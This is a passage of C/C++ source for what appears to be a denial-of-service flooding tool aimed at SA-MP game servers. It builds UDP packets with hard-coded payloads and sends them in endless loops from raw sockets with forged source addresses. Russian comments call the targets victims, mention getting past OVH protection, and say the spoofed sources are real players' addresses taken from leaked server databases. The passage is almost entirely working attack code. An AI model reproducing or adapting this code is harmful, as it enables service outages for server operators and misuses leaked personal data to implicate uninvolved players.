	memcpy((void*)udph + sizeof(struct udphdr), "\x0f\x80\x48\x85\x40\x15\xe0\x14\x2b\xea\x08\xc0\xf0\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x04\x84\x30\x20\x00\x91\x0b\x00\x2b\xc0\x14\x2b\xea\x04\x31\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x04\x84\x30\x21\x00\x91\x0b\x80\x2b\xc0\x14\x2b\xea\x0a\x91\x30\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x04\x84\x30\x22\x00\x91\x0c\x00\x2b\xc0\x14\x2b\xea\x0d\x51\x20\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x04\x84\x30\x23\x00\x91\x0c\x80\x2b\xc0\x14\x2b\xea\x0e\xf1\x70\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x04\x84\x30\x24\x00\x91\x0d\x00\x2b\xc0\x14\x2b\xea\x0b\x51\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x04\x84\x30", playloadlen);
	iph->id = NumID += htons(1); //прибавляем на +1 к сгенерированому числу идентификатора ип заголовка
	udph->len = htons(sizeof(struct udphdr) + playloadlen); //общий вес udpheader
	udph->check = 0; //Ебнулэнд
	udph->check = US->checksum_tcpudp(iph, udph, udph->len, sizeof(struct udphdr) + playloadlen); //Расчет контрольной суммы UDP датаграммы или TCP заголовка, не доебешся
	if (type == 0)
	{
		usleep(pps);
	}
	return;
}

void Packet::samp_dd28(struct iphdr* iph, struct udphdr* udph)
{
	int playloadlen = 186; //вес пакета udp/ip в байтах 
	void* data = (void*)udph + sizeof(struct udphdr);
	iph->tot_len = sizeof(struct iphdr) + sizeof(struct udphdr) + playloadlen; //общий вес ipheader
	memcpy((void*)udph + sizeof(struct udphdr), "\x12\x80\x48\x86\xc0\x15\xe0\x14\x2b\xea\x08\xc0\xf0\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x04\x84\x30\x26\x00\x91\x0e\x00\x2b\xc0\x14\x2b\xea\x04\x31\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x04\x84\x30\x27\x00\x91\x0e\x80\x2b\xc0\x14\x2b\xea\x0a\x91\x30\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x04\x84\x30\x28\x00\x91\x0f\x00\x2b\xc0\x14\x2b\xea\x0d\x51\x20\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x04\x84\x30\x29\x00\x91\x0f\x80\x2b\xc0\x14\x2b\xea\x0e\xf1\x70\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x04\x84\x30\x2a\x00\x91\x10\x00\x2b\xc0\x14\x2b\xea\x0b\x51\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x04\x84\x30", playloadlen);
	iph->id = NumID += htons(1); //прибавляем на +1 к сгенерированому числу идентификатора ип заголовка
	udph->len = htons(sizeof(struct udphdr) + playloadlen); //общий вес udpheader
	udph->check = 0; //Ебнулэнд
	udph->check = US->checksum_tcpudp(iph, udph, udph->len, sizeof(struct udphdr) + playloadlen); //Расчет контрольной суммы UDP датаграммы или TCP заголовка, не доебешся
	if (type == 0)
	{
		usleep(pps);
	}
	return;
}

void Packet::samp_dd29(struct iphdr* iph, struct udphdr* udph)
{
	int playloadlen = 186; //вес пакета udp/ip в байтах 
	void* data = (void*)udph + sizeof(struct udphdr);
	iph->tot_len = sizeof(struct iphdr) + sizeof(struct udphdr) + playloadlen; //общий вес ipheader
	memcpy((void*)udph + sizeof(struct udphdr), "\x15\x80\x48\x88\x40\x15\xe0\x14\x2b\xea\x08\xc0\xf0\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x04\x84\x30\x2c\x00\x91\x11\x00\x2b\xc0\x14\x2b\xea\x04\x31\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x04\x84\x30\x2d\x00\x91\x11\x80\x2b\xc0\x14\x2b\xea\x0a\x91\x30\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x04\x84\x30\x2e\x00\x91\x12\x00\x2b\xc0\x14\x2b\xea\x0d\x51\x20\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x04\x84\x30\x2f\x00\x91\x12\x80\x2b\xc0\x14\x2b\xea\x0e\xf1\x70\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x04\x84\x30\x30\x00\x91\x13\x00\x2b\xc0\x14\x2b\xea\x0b\x51\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x04\x84\x30", playloadlen);
	iph->id = NumID += htons(1); //прибавляем на +1 к сгенерированому числу идентификатора ип заголовка
	udph->len = htons(sizeof(struct udphdr) + playloadlen); //общий вес udpheader
	udph->check = 0; //Ебнулэнд
	udph->check = US->checksum_tcpudp(iph, udph, udph->len, sizeof(struct udphdr) + playloadlen); //Расчет контрольной суммы UDP датаграммы или TCP заголовка, не доебешся
	if (type == 0)
	{
		usleep(pps);
	}
	return;
}

void Packet::samp_dd30(struct iphdr* iph, struct udphdr* udph)
{
	int playloadlen = 527; //вес пакета udp/ip в байтах 
	void* data = (void*)udph + sizeof(struct udphdr);
	iph->tot_len = sizeof(struct iphdr) + sizeof(struct udphdr) + playloadlen; //общий вес ipheader
	memcpy((void*)udph + sizeof(struct udphdr), "\x24\x82\x48\x8d\x81\x15\xe0\x14\x2b\xea\x08\xc0\xf0\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x04\x84\x30\x4a\x04\x91\x1b\x82\x2b\xc0\x14\x2b\xea\x04\x31\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x04\x84\x30\x4b\x04\x91\x1c\x02\x2b\xc0\x14\x2b\xea\x0a\x91\x30\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x04\x84\x30\x4c\x04\x91\x1c\x82\x2b\xc0\x14\x2b\xea\x0d\x51\x20\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x04\x84\x30\x4d\x04\x91\x1d\x02\x2b\xc0\x14\x2b\xea\x0e\xf1\x70\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x04\x84\x30\x4e\x04\x91\x1d\x82\x2b\xc0\x14\x2b\xea\x0b\x51\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x04\x84\x30\x4f\x04\x91\x1e\x02\x2b\xc0\x14\x2b\xea\x08\xc0\xf0\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x04\x84\x30\x50\x04\x91\x1e\x82\x2b\xc0\x14\x2b\xea\x04\x31\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x04\x84\x30\x51\x04\x91\x1f\x02\x2b\xc0\x14\x2b\xea\x0a\x91\x30\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x04\x84\x30\x52\x04\x91\x1f\x82\x2b\xc0\x14\x2b\xea\x0d\x51\x20\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x04\x84\x30\x53\x04\x91\x20\x02\x2b\xc0\x14\x2b\xea\x0e\xf1\x70\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x04\x84\x30\x54\x04\x91\x20\x82\x2b\xc0\x14\x2b\xea\x0b\x51\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x04\x84\x30\x56\x04\x91\x21\x02\x2b\xc0\x14\x2b\xea\x08\xc0\xf0\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x04\x84\x30\x57\x04\x91\x21\x82\x2b\xc0\x14\x2b\xea\x04\x31\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x04\x84\x30\x58\x04\x91\x22\x02\x2b\xc0\x14\x2b\xea\x0a\x91\x30\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x04\x84\x30\x59\x04\x91\x22\x82\x2b\xc0\x14\x2b\xea\x0d\x51\x20\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x04\x84\x30\x5a\x04\x91\x23\x02\x2b\xc0\x14\x2b\xea\x0e\xf1\x70\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x04\x84\x30", playloadlen);
	iph->id = NumID += htons(1); //прибавляем на +1 к сгенерированому числу идентификатора ип заголовка
	udph->len = htons(sizeof(struct udphdr) + playloadlen); //общий вес udpheader
	udph->check = 0; //Ебнулэнд
	udph->check = US->checksum_tcpudp(iph, udph, udph->len, sizeof(struct udphdr) + playloadlen); //Расчет контрольной суммы UDP датаграммы или TCP заголовка, не доебешся
	if (type == 0)
	{
		usleep(pps);
	}
	return;
}

void Packet::samp_dd31(struct iphdr* iph, struct udphdr* udph)
{
	int playloadlen = 31; //вес пакета udp/ip в байтах 
	void* data = (void*)udph + sizeof(struct udphdr);
	iph->tot_len = sizeof(struct iphdr) + sizeof(struct udphdr) + playloadlen; //общий вес ipheader
	memcpy((void*)udph + sizeof(struct udphdr), "\x09\x80\x48\x82\x40\x15\xe0\x14\x2b\xea\x0d\x71\x10\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x04\x84\x30", playloadlen);
	iph->id = NumID += htons(1); //прибавляем на +1 к сгенерированому числу идентификатора ип заголовка
	udph->len = htons(sizeof(struct udphdr) + playloadlen); //общий вес udpheader
	udph->check = 0; //Ебнулэнд
	udph->check = US->checksum_tcpudp(iph, udph, udph->len, sizeof(struct udphdr) + playloadlen); //Расчет контрольной суммы UDP датаграммы или TCP заголовка, не доебешся
	if (type == 0)
	{
		usleep(pps);
	}
	return;
}

void Packet::samp_dd32(struct iphdr* iph, struct udphdr* udph)
{
	int playloadlen = 31; //вес пакета udp/ip в байтах 
	void* data = (void*)udph + sizeof(struct udphdr);
	iph->tot_len = sizeof(struct iphdr) + sizeof(struct udphdr) + playloadlen; //общий вес ipheader
	memcpy((void*)udph + sizeof(struct udphdr), "\x0a\x00\x48\x82\x80\x15\xe0\x14\x2b\xea\x03\x61\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x04\x84\x30", playloadlen);
	iph->id = NumID += htons(1); //прибавляем на +1 к сгенерированому числу идентификатора ип заголовка
	udph->len = htons(sizeof(struct udphdr) + playloadlen); //общий вес udpheader
	udph->check = 0; //Ебнулэнд
	udph->check = US->checksum_tcpudp(iph, udph, udph->len, sizeof(struct udphdr) + playloadlen); //Расчет контрольной суммы UDP датаграммы или TCP заголовка, не доебешся
	if (type == 0)
	{
		usleep(pps);
	}
	return;
}

void Packet::samp_dd33(struct iphdr* iph, struct udphdr* udph)
{
	int playloadlen = 31; //вес пакета udp/ip в байтах 
	void* data = (void*)udph + sizeof(struct udphdr);
	iph->tot_len = sizeof(struct iphdr) + sizeof(struct udphdr) + playloadlen; //общий вес ipheader
	memcpy((void*)udph + sizeof(struct udphdr), "\x0a\x80\x48\x82\xc0\x15\xe0\x14\x2b\xea\x0e\xa3\xd0\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x04\x84\x30", playloadlen);
	iph->id = NumID += htons(1); //прибавляем на +1 к сгенерированому числу идентификатора ип заголовка
	udph->len = htons(sizeof(struct udphdr) + playloadlen); //общий вес udpheader
	udph->check = 0; //Ебнулэнд
	udph->check = US->checksum_tcpudp(iph, udph, udph->len, sizeof(struct udphdr) + playloadlen); //Расчет контрольной суммы UDP датаграммы или TCP заголовка, не доебешся
	if (type == 0)
	{
		usleep(pps);
	}
	return;
}

void Packet::samp_dd34(struct iphdr* iph, struct udphdr* udph)
{
	int playloadlen = 20; //вес пакета udp/ip в байтах 
	void* data = (void*)udph + sizeof(struct udphdr);
	iph->tot_len = sizeof(struct iphdr) + sizeof(struct udphdr) + playloadlen; //общий вес ipheader
	memcpy((void*)udph + sizeof(struct udphdr), "\x02\x00\xc2\x7c\x14\x9b\xe6\x00\x00\x07\x5d\x26\xa0\x01\xe0\x00\x00\x00\x10\x00", playloadlen);
	iph->id = NumID += htons(1); //прибавляем на +1 к сгенерированому числу идентификатора ип заголовка
	udph->len = htons(sizeof(struct udphdr) + playloadlen); //общий вес udpheader
	udph->check = 0; //Ебнулэнд
	udph->check = US->checksum_tcpudp(iph, udph, udph->len, sizeof(struct udphdr) + playloadlen); //Расчет контрольной суммы UDP датаграммы или TCP заголовка, не доебешся
	if (type == 0)
	{
		usleep(pps);
	}
	return;
}




void * Flooding_TCP(void *ThreadID) //https://youtu.be/MroIfasT4_U
{
	struct thread_data_tcp *Thread_tcp = (struct thread_data_tcp *)ThreadID;
	struct  slist *list_node = Thread_tcp->list_node;
	struct  abuse_list* list_node_abuse = Thread_tcp->list_node_abuse;
	struct tcphdr *tcph = (void *)iphtcp + sizeof(struct iphdr);
	memset(datagram_tcp, 0, MAX_PACKET_SIZE);
	int stcp = socket(PF_INET, SOCK_RAW, IPPROTO_TCP); //UDP TCP ICMP RAW UDPLITE https://youtu.be/nZXRV4MezEw
	if(stcp < 0)
	{
		fprintf(stderr, OBFUSCATE("\x1B[31m Could not open raw socket. \x1B[0m\n"));
		exit(-1);
	}
	int tmptcp = 1;
	const int *valtcp = &tmptcp;
	if(setsockopt(stcp, IPPROTO_IP, IP_HDRINCL, valtcp, sizeof (tmptcp)) < 0)
	{
		fprintf(stderr, OBFUSCATE("\x1B[31m Error: setsockopt() - Cannot set HDRINCL! \x1B[0m\n"));
		exit(-1);
	}
	US->init_rand(time(NULL)); //ну тип шлем нахуй протект овх

	while(1) //астанавитесь, я выйду
	{
		//PKT->eth_header(); //кривоват, потом обновлю
		PKT->iptcp_header(iphtcp); //https://youtu.be/zpzdgmqIHOQ
		iphtcp->daddr = list_node->datalist.sin_addr.s_addr; //ипы атакованных(жертв)
		iphtcp->saddr = list_node_abuse->adata.sin_addr.s_addr; //абуз ипы атакующие
		//////////////////////////////////////////////////////////////////////////////////////////////////
		NumID_TCP = htons(US->RandNum(10000, 40000)); //задаем начальное рандомное число к которому будем прибавлять
		prottl = US->RandNum(63, 143); //https://youtu.be/FVkelRKStuw
		if(zalup == 0) //not rand
		{
			tcph->dest = htons(list_node->datalist.sin_port); //порт сервера
		}
		if(zalup == 1) //rand
		{
			tcph->dest = htons(1 + rand() % 65535); //порт сервера rand
		}
		static int timer = 0;
		if ( GetTickCount() - timer > nexttonext + rand() % 100) //1 раз в 44 секунды. Динамически настраивать разрешено, от 33 секунд до 120 секунд, не более(240000ms в особых случаях)
		{
			list_node = list_node->snext; //перебор атакованных жертв 
			timer = GetTickCount();
		}
		list_node_abuse = list_node_abuse->anext; //ага да, перебор ип адресов провайдеров реальных самп игроков, беру со слитых баз данных рп серверов
		////////////////////////////////////////////////////////////////////////////////////////////////// какой то тест трафик
		
		//////////////////////////////////////////////////////////////////////////////////////////////////
		if (type == 2)
		{
			usleep(pps);
		}
    }
}

void * Flooding_UDP(void *ThreadID) //https://youtu.be/gmg_hHBXQvI
{
	struct thread_data *Thread = (struct thread_data *)ThreadID;
	struct  slist *list_node = Thread->list_node;
	struct  abuse_list* list_node_abuse = Thread->list_node_abuse;
	struct udphdr *udph = (void *)iph + sizeof(struct iphdr);
	memset(datagram, 0, MAX_PACKET_SIZE);
	int s = socket(PF_INET, SOCK_RAW, IPPROTO_UDP); //UDP TCP ICMP RAW UDPLITE https://youtu.be/nZXRV4MezEw
	if(s < 0)
	{
		fprintf(stderr, OBFUSCATE("\x1B[31m Could not open raw socket. \x1B[0m\n"));
		exit(-1);
	}
	int tmp = 1;
	const int *val = &tmp;
	if(setsockopt(s, IPPROTO_IP, IP_HDRINCL, val, sizeof (tmp)) < 0)
	{
		fprintf(stderr, OBFUSCATE("\x1B[31m Error: setsockopt() - Cannot set HDRINCL! \x1B[0m\n"));
		exit(-1);
	}
	US->init_rand(time(NULL)); //ну тип шлем нахуй протект овх
	while(1) //астанавитесь, я выйду
	{
		//PKT->eth_header(); //кривоват, потом обновлю
		src_ips[0] = US->RandNum(1, 223);
		src_ips[1] = US->RandNum(1, 255);
		src_ips[2] = US->RandNum(1, 255);
		src_ips[3] = US->RandNum(1, 255);
		iph->daddr = *((unsigned int*)src_ips);
		//iph->daddr = list_node->datalist.sin_addr.s_addr; //ипы атакованных(жертв)
		//////////////////////////////////////////////////////////////////////////////////////////////////
		prottl = US->RandNum(63, 143); //https://youtu.be/FVkelRKStuw
		NumID = htons(US->RandNum(10000, 65535)); //задаем начальное рандомное число к которому будем прибавлять
		if(zalup == 0) //not rand
		{
			udph->dest = htons(list_node->datalist.sin_port); //порт сервера
		}
		if(zalup == 1) //rand
		{
			udph->dest = htons(US->RandNum(10, 65535)); //порт сервера rand
		}
		//US->samp_relevance(dst_port); //https://youtu.be/gKHe12T6GMY
		static int timer = 0;
		if ( GetTickCount() - timer > nexttonext ) //1 раз в 44 секунды. Динамически настраивать разрешено, от 33 секунд до 120 секунд, не более(240000ms в особых случаях)
		{
			list_node = list_node->snext; //перебор атакованных жертв 
			timer = GetTickCount();
		}
		////////////////////////////////////////////////////////////////////////////////////////////////// 
		PKT->ip_header(iph); //https://youtu.be/zpzdgmqIHOQ
		udph->source = htons(7777); //порт клиента
		if (TypeGenIP == 0)
		{
			iph->saddr = list_node_abuse->adata.sin_addr.s_addr; //абуз ипы атакующие
		}
		////////////////////////////////////////////////////////////////////////////////////////////////// самп квери
		PKT->samp_dd1(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_dd2(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_dd3(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_dd4(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_dd5(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_dd6(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_dd7(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_dd8(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_dd9(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_dd10(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_dd11(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_dd12(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_dd13(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_dd14(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_dd15(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_dd16(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_dd17(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_dd18(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_dd19(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_dd20(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_dd21(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_dd22(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_dd23(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_dd24(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_dd25(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_dd26(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_dd27(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_dd28(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_dd29(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_dd30(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_dd31(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_dd32(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_dd33(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_dd34(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));
		if (TypeGenIP == 0)
		{
			list_node_abuse = list_node_abuse->anext; //ага да, перебор ип адресов провайдеров реальных самп игроков, беру со слитых баз данных рп серверов
		}
		////////////////////////////////////////////////////////////////////////////////////////////////// 
		PKT->ip_header(iph); //https://youtu.be/zpzdgmqIHOQ
		udph->source = htons(7777); //порт клиента
		if (TypeGenIP == 0)
		{
			iph->saddr = list_node_abuse->adata.sin_addr.s_addr; //абуз ипы атакующие
		}
		////////////////////////////////////////////////////////////////////////////////////////////////// самп квери
		PKT->samp_dd1(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_dd2(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_dd3(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_dd4(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_dd5(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_dd6(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_dd7(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_dd8(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_dd9(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_dd10(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_dd11(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_dd12(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_dd13(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_dd14(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_dd15(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_dd16(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_dd17(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_dd18(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_dd19(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_dd20(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_dd21(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_dd22(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_dd23(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_dd24(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_dd25(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_dd26(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_dd27(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_dd28(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_dd29(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_dd30(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_dd31(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_dd32(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_dd33(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_dd34(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));
		if (TypeGenIP == 0)
		{
			list_node_abuse = list_node_abuse->anext; //ага да, перебор ип адресов провайдеров реальных самп игроков, беру со слитых баз данных рп серверов
		}
		////////////////////////////////////////////////////////////////////////////////////////////////// 
		PKT->ip_header(iph); //https://youtu.be/zpzdgmqIHOQ
		udph->source = htons(7777); //порт клиента
		if (TypeGenIP == 0)
		{
			iph->saddr = list_node_abuse->adata.sin_addr.s_addr; //абуз ипы атакующие
		}
		////////////////////////////////////////////////////////////////////////////////////////////////// самп квери
		PKT->samp_vv37(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_vv38(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_vv1(iph, udph);
